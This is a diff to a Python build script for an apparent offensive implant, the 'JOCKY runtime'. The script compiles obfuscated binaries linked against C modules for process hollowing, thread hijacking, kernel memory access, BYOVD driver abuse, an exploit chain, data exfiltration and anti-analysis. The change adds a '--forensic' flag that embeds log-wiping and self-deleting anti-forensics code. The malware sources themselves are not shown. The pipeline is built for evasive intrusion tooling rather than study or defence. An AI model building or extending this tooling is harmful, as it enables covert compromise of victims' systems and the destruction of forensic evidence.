@@ -220,7 +220,7 @@ def stage_compile(bc_path, build_dir, platform="windows"):
     return obj_path
 
 
-def stage_compile_runtime(build_dir, platform="windows"):
+def stage_compile_runtime(build_dir, platform="windows", forensic=False):
     log("RUNTIME", f"Compiling JOCKY runtime for {platform.upper()}")
     include_dir = RUNTIME_DIR / "include"
     objs = []
@@ -238,23 +238,21 @@ def stage_compile_runtime(build_dir, platform="windows"):
         LINUX = RUNTIME_DIR / "linux"
         sources = [
             # Core runtime files (Phase 1-4 implementations)
-            LINUX / "io" / "io_core.c",                      # File I/O + output
-            LINUX / "core" / "runtime_init.c",               # Crypto + OpenSSL init
-            LINUX / "core" / "sandbox_ops.c",                # Namespace isolation
-            LINUX / "core" / "audit_ops.c",                  # Audit logging + threat scoring
-            LINUX / "core" / "remaining_stubs.c",            # Phase 3-4 implementations
-            LINUX / "anti_analysis" / "detection.c",         # Debugger/sandbox/VM detection
-            LINUX / "process" / "ptrace_control.c",          # PTRACE operations
-            LINUX / "process" / "thread_hijack.c",           # Thread code injection
-            LINUX / "process" / "process_hollow.c",          # Process replacement
-            LINUX / "kernel" / "kread_kwrite.c",             # Kernel memory access
-            LINUX / "kernel" / "byovd_ops.c",                # BYOVD driver operations
-            LINUX / "kernel" / "module_ops.c",               # Module resolution + syscall table
-            LINUX / "exploitation" / "fence2pwn.c",          # FENCE2PWN exploit chain
-            LINUX / "exfil" / "exfil_channels.c",            # Data exfiltration
-            LINUX / "core" / "link_stubs.c",                  # Link stubs for undefined references
-
-            # Legacy syscall files (if they exist and don't conflict)
+            LINUX / "io" / "io_core.c",
+            LINUX / "core" / "runtime_init.c",
+            LINUX / "core" / "sandbox_ops.c",
+            LINUX / "core" / "audit_ops.c",
+            LINUX / "core" / "remaining_stubs.c",
+            LINUX / "anti_analysis" / "detection.c",
+            LINUX / "process" / "ptrace_control.c",
+            LINUX / "process" / "thread_hijack.c",
+            LINUX / "process" / "process_hollow.c",
+            LINUX / "kernel" / "kread_kwrite.c",
+            LINUX / "kernel" / "byovd_ops.c",
+            LINUX / "kernel" / "module_ops.c",
+            LINUX / "exploitation" / "fence2pwn.c",
+            LINUX / "exfil" / "exfil_channels.c",
+            LINUX / "core" / "link_stubs.c",
             RUNTIME_DIR / "util" / "mem.c",
             RUNTIME_DIR / "compression" / "compression.c",
             RUNTIME_DIR / "crypto" / "crypto.c",
@@ -268,6 +266,9 @@ def stage_compile_runtime(build_dir, platform="windows"):
             LINUX / "syscalls" / "ipc_syscall.c",
             LINUX / "syscalls" / "sysinfo_syscall.c",
         ]
+
+        if forensic:
+            sources.append(LINUX / "forensics" / "linux_forensics.c")
 
         for src in sources:
             if not src.exists():
@@ -339,12 +340,16 @@ def stage_compile_runtime(build_dir, platform="windows"):
         WIN / "byovd" / "byovd_modular.c",
         WIN / "registry" / "registry.c",
         WIN / "audit" / "audit.c",
-        WIN / "anti_forensics" / "forensics.c",
-        WIN / "anti_forensics" / "logs.c",
-        WIN / "anti_forensics" / "self_delete.c",
         WIN / "security" / "token_manipulation.c",
         WIN / "exfil" / "enhanced_exfiltration.c",
     ]
+
+    if forensic:
+        sources_win += [
+            WIN / "anti_forensics" / "forensics.c",
+            WIN / "anti_forensics" / "logs.c",
+            WIN / "anti_forensics" / "self_delete.c",
+        ]
 
     cflags_win = [
         "-O2", "-c", "-D_WIN32_WINNT=0x0600", "-DUNICODE", "-D_UNICODE",
@@ -512,6 +517,7 @@ def main():
     parser.add_argument("--preset", choices=["none", "light", "standard", "aggressive"], default="standard", help="Obfuscation preset (default: standard)")
     parser.add_argument("--mlir-passes", type=str, default="", help="Custom MLIR passes (comma-separated flags, overrides preset)")
     parser.add_argument("--llvm-passes", type=str, default="", help="Custom LLVM passes (comma-separated, overrides preset)")
+    parser.add_argument("--forensic", action="store_true", help="Embed forensic trace cleanup runtime into the binary")
 
     args = parser.parse_args()
 
@@ -526,6 +532,7 @@ def main():
     log("PIPELINE", f"Toolchain: {TOOLCHAIN}")
     log("PIPELINE", f"Target: {args.platform.title()} x86_64")
     log("PIPELINE", f"Preset: {args.preset}")
+    log("PIPELINE", f"Forensic cleanup: {'enabled' if args.forensic else 'disabled'}")
     log("PIPELINE", "=" * 60)
 
     start = time.time()
@@ -575,7 +582,7 @@ def main():
     obj_path = stage_compile(obf_bc, build_dir, args.platform)
 
     log("PIPELINE", "Stage 5b/6: Compile Runtime")
-    runtime_objs = stage_compile_runtime(build_dir, args.platform)
+    runtime_objs = stage_compile_runtime(build_dir, args.platform, forensic=args.forensic)
 
     log("PIPELINE", "Stage 6/6: Link")
     stem = Path(source_file).stem
